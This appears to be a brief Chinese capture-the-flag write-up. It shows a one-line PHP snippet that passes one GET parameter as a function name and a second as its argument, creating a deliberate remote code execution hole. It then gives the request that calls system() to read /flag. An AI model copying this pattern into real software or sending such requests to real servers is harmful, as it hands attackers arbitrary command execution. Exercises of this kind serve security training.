## 漏洞点
```php
<?php if(isset($_GET['a']))$_GET['a']($_GET['b']);?>
```
## 利用方法
```shell
index.php?a=system&b=cat /flag
```
